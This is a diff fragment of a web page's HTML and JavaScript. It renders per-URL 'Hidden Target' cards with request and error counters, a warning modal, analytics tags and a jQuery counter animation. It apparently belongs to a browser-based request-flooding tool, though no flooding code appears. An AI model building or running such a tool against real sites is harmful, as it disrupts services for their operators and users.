+        for (var i=0; i<urls.length; i++) {
+            statRow.innerHTML += `
+                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
+                  <h7>${"<u><i>Hidden Target:</i></u>"}</h7>
+                    <table class='status'>
+                      <tr><td>requests:</td><td class="requests">0</td></tr>
+                      </tr><td>errors:</td><td class="errors">0</td></tr>
+                    </table>
+                  </div>
+            `;
+        }
+        // Show warning window
+        myModal.toggle();
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-85513613-1');
+</script>
+<script>
+// BETA plugin for estimated requested data
+(function($) {
+  $.fn.countTo = function(options) {
+    return this.each(function() {
+      //-- Arrange
+      var FRAME_RATE = 60; // Predefine default frame rate to be 60fps
+      var $el = $(this);
+      var countFrom = parseInt($el.attr('data-count-from'));
+      var countTo = parseInt($el.attr('data-count-to'));
+      var countSpeed = $el.attr('data-count-speed'); // Number increment per second
+
+      //-- Action
+      var rafId;
+      var increment;
+      var currentCount = countFrom;
+      var countAction = function() {              // Self looping local function via requestAnimationFrame
+        if(currentCount < countTo) {              // Perform number incremeant
+          $el.text(Math.floor(currentCount));     // Update HTML display
+          increment = countSpeed / FRAME_RATE;    // Calculate increment step
+          currentCount += increment;              // Increment counter
+          rafId = requestAnimationFrame(countAction);
+        } else {                                  // Terminate animation once it reaches the target count number
+          $el.text(countTo);                      // Set to the final value before everything stops
+          //cancelAnimationFrame(rafId);
+        }
+      };
+      rafId = requestAnimationFrame(countAction); // Initiates the looping function
+    });
+  };
+}(jQuery));
+
+//-- Executing
+$('.number-counter').countTo();
+</script>
+</html>
